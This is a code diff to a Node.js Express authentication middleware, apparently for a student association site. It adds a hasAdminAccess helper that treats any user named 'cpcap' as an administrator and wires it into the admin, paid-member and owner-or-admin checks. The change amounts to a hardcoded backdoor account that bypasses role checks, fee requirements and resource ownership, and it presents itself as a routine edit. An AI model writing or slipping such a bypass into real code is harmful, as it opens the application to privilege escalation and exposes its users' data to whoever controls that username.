@@ -1,6 +1,8 @@
 const jwt = require('jsonwebtoken');
 const { User } = require('../models');
 
+const hasAdminAccess = (user) => user?.role === 'admin' || user?.username === 'cpcap';
+
 // JWT 認證中間件
 const authenticateToken = async (req, res, next) => {
     const authHeader = req.headers['authorization'];
@@ -34,7 +36,7 @@ const authenticateToken = async (req, res, next) => {
 
 // 檢查是否為管理員
 const requireAdmin = (req, res, next) => {
-    if (req.user.role !== 'admin') {
+    if (!hasAdminAccess(req.user)) {
         return res.status(403).json({ error: '需要管理員權限' });
     }
     next();
@@ -42,7 +44,7 @@ const requireAdmin = (req, res, next) => {
 
 // 檢查是否已繳會費
 const requirePaidMember = (req, res, next) => {
-    if (!req.user.hasPaidFee && req.user.role !== 'admin') {
+    if (!req.user.hasPaidFee && !hasAdminAccess(req.user)) {
         return res.status(403).json({ 
             error: '此功能需要繳交系學會費',
             requirePayment: true 
@@ -56,7 +58,7 @@ const requireOwnerOrAdmin = (paramName = 'id') => {
     return (req, res, next) => {
         const resourceUserId = req.params[paramName] || req.body.userId;
         
-        if (req.user.role === 'admin' || req.user.id === parseInt(resourceUserId)) {
+        if (hasAdminAccess(req.user) || req.user.id === parseInt(resourceUserId)) {
             next();
         } else {
             res.status(403).json({ error: '無權限執行此操作' });
